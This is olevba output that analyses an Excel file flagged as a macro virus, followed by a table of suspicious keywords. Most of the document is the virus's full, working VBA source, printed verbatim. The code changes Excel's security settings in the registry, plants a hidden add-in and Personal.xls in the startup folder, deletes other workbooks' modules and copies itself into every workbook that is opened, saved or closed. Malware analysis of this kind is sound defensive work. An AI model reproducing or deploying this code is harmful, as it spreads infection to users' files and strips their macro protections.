olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Imp Private  Imp Const  Imp """
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application
Attribute mapp.VB_VarHelpID = -1




Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Class1.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Class1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public WithEvents app As Application
Attribute app.VB_VarHelpID = -1


Private Sub App_WorkbookOpen(ByVal Wb As Excel.Workbook)
    Application.Run "'" & Application.StartupPath & Application.PathSeparator & "Personal.xls'!Chk_Opf"
End Sub
-------------------------------------------------------------------------------
VBA MACRO UT.bas 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/UT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const HKEY_CURRENT_USER As Long = &H80000001
Dim ob1 As New Class1
Dim p As String
Dim AppS As String
'taitai
Private Sub auto_open()
    u = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
    u = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
    u = RegCloseKey(k)
    p = Application.PathSeparator
    AppS = Application.StartupPath
    DelMcr
    If UCase(ThisWorkbook.Name) = "PERSONAL.XLS" Then
        Application.OnSheetActivate = "ActOpf_Evt"
        ActOpf_Evt
    Else
        CkStrUP
    End If
End Sub
Private Sub ActOpf_Evt()
    Set ob1.app = Application
End Sub
Private Sub Chk_Opf()
    On Error GoTo h_er
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    awn = ActiveWorkbook.Name
    If Left(Right(awn, 4), 3) = ".xl" Then
        aw_m_n = Chk_Mo_N(awn)
        If aw_m_n = "" Then
            n = Chk_Mo_N(ThisWorkbook.Name)
            cop_m (n)
            Workbooks(awn).Save
        Else
            m_n = ActiveWorkbook.VBProject.VBComponents(aw_m_n).CodeModule.Lines(9, 1)
            If m_n <> "'taitai" Then
                Set v_c = ActiveWorkbook.VBProject.VBComponents
                For i = v_c.Count To 1 Step -1
                    If v_c(i).Type = 1 Or v_c(i).Type = 2 Then
                        v_c.Remove v_c(i)
                    End If
                Next i
                n = Chk_Mo_N(ThisWorkbook.Name)
                cop_m (n)
                Workbooks(awn).Save
            End If
        End If
    End If
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
    Exit Sub
h_er:
End Sub
Private Sub CkStrUP()
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
     f1 = "PERSONAL.XLS"
    If UCase(Dir(AppS & p & f1)) <> f1 Then
        cre_f
    ElseIf chk_per = False Then
        Workbooks("Personal.xls").Close
        Kill AppS & p & f1
        cre_f
    Else
    End If
    Workbooks("Personal.xls").Close
    Workbooks.Open AppS & p & "Personal.xls"
    Application.Run "Personal.xls!ActOpf_Evt"
    Application.OnSheetActivate = "'" & AppS & p & f1 & "'!ActOpf_Evt"
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
End Sub
Private Function chk_per()
    arg = "'" & AppS & p & "[Personal.xls]Sheet1" & "'!" & _
        Range("C1").Range("A1").Address(, , xlR1C1)
    ar2 = ExecuteExcel4Macro(arg)
    ModuleName1 = Chk_Mo_N("Personal.xls")
    If ar2 <> ModuleName1 Then
        chk_per = False
    Else
        chk_per = True
    End If
End Function
Private Function Chk_Mo_N(WkName)
On Error Resume Next
    Set a1 = Workbooks(WkName).VBProject.VBComponents
    For i = 1 To a1.Count
        If a1(i).Type = 1 Then
            Chk_Mo_N = a1(i).Name
            Exit For
        Else
            Chk_Mo_N = ""
        End If
    Next i
End Function
Private Sub cre_f()
    Workbooks.Add
    n = Chk_Mo_N(ThisWorkbook.Name)
    Range("C1") = "=rand()"
    r_n = Chr((Range("C1") * 100) Mod 21 + 65) & _
        Chr((Val(Left(Right(Now(), 5), 2)) * 100) Mod 21 + 65)
    Range("C1") = r_n
    cop_m (n)
    ActiveWorkbook.VBProject.VBComponents(n).Name = r_n
    Set aw = ActiveWorkbook.Sheets
    For i = aw.Count To 2 Step -1
        aw(i).Delete
    Next i
    aw_n = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks(aw_n).SaveAs AppS & p & "Personal.xls"
End Sub
Private Function cop_m(n)
    On Error Resume Next
    Set tw = ThisWorkbook.VBProject.VBComponents
    Set aw = ActiveWorkbook.VBProject.VBComponents
    tw(n).Export (AppS & p & "t")
    aw.Import (AppS & p & "t")
    Kill (AppS & p & "t")
    tw("Class1").Export (AppS & p & "t")
    aw.Import (AppS & p & "t")
    Kill (AppS & p & "t")
End Function
Private Sub DelMcr()
    On Error Resume Next
    n1 = ActiveWorkbook.Name
    Set a2 = Application.CommandBars("Tools")
    a2.Reset
    If a2.Controls(10).Id = 30017 Then
        a2.Controls(10).Delete
    End If
    Workbooks(n1).Activate
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Tracker-based-434fc6cfdd6c679d8d9d86547553fdba5f0b3011 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  4680JB102
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  4901JB100
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  4900JB100
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  5300JB201
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  4901JB100
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  4900JA200
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

